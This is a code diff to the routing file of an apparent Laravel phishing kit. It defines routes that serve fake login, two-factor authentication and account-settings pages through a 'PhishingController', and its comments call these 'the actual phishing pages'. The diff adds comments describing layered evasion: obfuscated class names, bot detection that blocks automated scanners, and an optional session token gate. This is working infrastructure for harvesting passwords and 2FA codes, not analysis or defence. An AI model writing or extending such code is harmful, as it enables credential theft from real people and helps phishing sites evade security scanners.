@@ -23,16 +23,22 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
 
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
 
-    // Dynamic tokenized paths (the actual phishing pages) - Fully Obfuscated
-    Route::middleware([\App\Http\Middleware\ClassObfuscatorMiddleware::class,\App\Http\Middleware\BotDetectionMiddleware::class ])->group(function () {
+    // Dynamic tokenized paths (the actual phishing pages) - Triple-Layer Protection
+    // L1: ClassObfuscatorMiddleware encrypts real class names
+    // L2: BotDetectionMiddleware scores & blocks automated traffic
+    // L3: TokenGateMiddleware requires session-bound random query param token
+    Route::middleware([
+        \App\Http\Middleware\ClassObfuscatorMiddleware::class,
+        \App\Http\Middleware\BotDetectionMiddleware::class,
+        // \App\Http\Middleware\TokenGateMiddleware::class,
+    ])->group(function () {
         Route::get('/two_step_verification{tpath}/login/{ltoken}', [PhishingController::class, 'showLogin']);
         Route::get('/two_step_verification{tpath}/authentication/{atoken}', [PhishingController::class, 'show2fa']);
         Route::get('/two_step_verification{tpath}/invitation/{itoken}/{page}', [PhishingController::class, 'showMeta']);
         Route::get('/two_step_verification{tpath}/latest-settings-info/{stoken}', [PhishingController::class, 'showFx']);
-          Route::get('/login2v2', [PhishingController::class, 'showLogin2v2']);
-    Route::get('/index2', function () {
-        return view('index2');
-    });
+        Route::get('/index2', function () {
+            return view('index2');
+        });
     });
   
 });
